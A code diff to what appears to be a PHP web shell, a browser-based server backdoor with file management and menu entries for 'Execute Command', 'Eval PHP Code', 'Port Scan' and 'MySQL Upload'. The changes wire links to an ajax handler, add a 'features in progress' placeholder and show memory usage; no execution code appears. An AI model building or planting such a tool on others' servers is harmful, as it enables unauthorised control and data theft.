@@ -52,18 +52,18 @@ HTML;
   <!--file-->
   <dd class="{className}" onmouseover="this.className='focus';" onmouseout="this.className='{className}';">
     <span class="in">
-     <input name="dl[]" type="checkbox" value="{return_link}">
+     <input name="dl[]" type="checkbox" value="{return_link}" onclick="ajax(this.name,2)">
     </span>
     <span>
     <a href="javascript:void()" name="{return_link}" onclick="{return_onclick}">{return_file}</a>
     </span>
     <span>
-     <a href="javascript:void();">{return_time}</a>
+     <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">{return_time}</a>
     </span>
     <span>{return_size}</span>
     <span>
-     <a href="javascript:void();">{return_chmod}</a> / 
-     <a href="javascript:void();">{return_perms}</a>
+     <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">{return_chmod}</a> / 
+     <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">{return_perms}</a>
     </span>
     <span>
      {is_folder}
@@ -78,15 +78,15 @@ HTML;
         if(is_dir($file.$gbk)){
             $return_onclick="ajax(this.name,1)";
             $return_folder='
-            <a href="javascript:void();">Rename</a>';
+            <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">Rename</a>';
         }
         if(is_file($file.$gbk)){
             $return_onclick="ajax(this.name,2)";
             $return_folder='
-            <a href="javascript:void();">Down</a> | 
-            <a href="javascript:void();">Copy</a> | 
-            <a href="javascript:void();">Edit</a> | 
-            <a href="javascript:void();">Rename</a>';
+            <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">Down</a> | 
+            <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">Copy</a> | 
+            <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">Edit</a> | 
+            <a href="javascript:void();" name="{return_link}" onclick="ajax(this.name,2)">Rename</a>';
         }
         $search=array('{className}',
                       '{return_file}',
@@ -118,6 +118,7 @@ HTML;
     $directory['folder']=count($dir);
     $directory['file']=count($files);
     $directory['time']=self::G('runtime','end');
+    $directory['memory']=self::byte_format(memory_get_peak_usage());
     unset($dir,$files);
     if(!ob_start("ob_gzhandler")) ob_start();
     echo json_encode($directory);
@@ -155,6 +156,7 @@ static protected function perms($file, $type = '1') {
  <script type="text/javascript">
   function ajax(arg,type){
    load.style.display="block";
+   if(type==2 || arg==2) load.innerHTML="功能陆续完善中......";
    if(type==1) arg='?action=show&dir='+arg;
    var options={};
     options.url=arg?arg:'?action=show';
@@ -183,6 +185,7 @@ function callback(){
 	var json = eval("("+this.responseText+")");
     show.innerHTML = json.data;
     runtime.innerHTML = json.time;
+    memory.innerHTML = json.memory;
     load.style.display="none";
 }
 </script>
@@ -230,7 +233,7 @@ loading……
 <div class="h"></div>
 <div id="footer">
   <span style="float:right;">
-     Processed in <span id="runtime"></span> second(s) {gzip}
+     Processed in <span id="runtime"></span> second(s) {gzip} usage:<span id="memory">{memory}</span>
   </span>
   Powered by {copyright}
   . Copyright (C) 2010-2012
@@ -244,18 +247,18 @@ ajax();
 HTML;
     $actions = array(
       'WebRoot' => $_SERVER['DOCUMENT_ROOT'],
-      'Create Directory' => '',
-      'Create File' => '',
+      'Create Directory' => '2',
+      'Create File' => '2',
       );
     $menus = array(
       'Logout',
       'File Manager' => $_SERVER['DOCUMENT_ROOT'],
-      'MYSQL Manager' => '',
-      'MySQL Upload' => '',
-      'Execute Command' => '',
-      'PHP Variable' => '',
-      'Port Scan' => '',
-      'Eval PHP Code' => '');
+      'MYSQL Manager' => '2',
+      'MySQL Upload' => '2',
+      'Execute Command' => '2',
+      'PHP Variable' => '2',
+      'Port Scan' => '2',
+      'Eval PHP Code' => '2');
     $menu = '';
     $action = '';
     $logout = array_shift($menus);
@@ -279,7 +282,8 @@ HTML;
       '{copyright}',
       '{cdrom}',
       '{action}',
-      '{gzip}');
+      '{gzip}',
+      '{memory}');
     $replace = array(
       title,
       $_SERVER['HTTP_HOST'],
@@ -290,7 +294,8 @@ HTML;
       copyright,
       self::disk(),
       trim($action, '| '),
-      gzip);
+      gzip,
+      self::byte_format(memory_get_peak_usage()));
     $eof = str_replace($serach, $replace, $eof);
     echo $eof;
   }
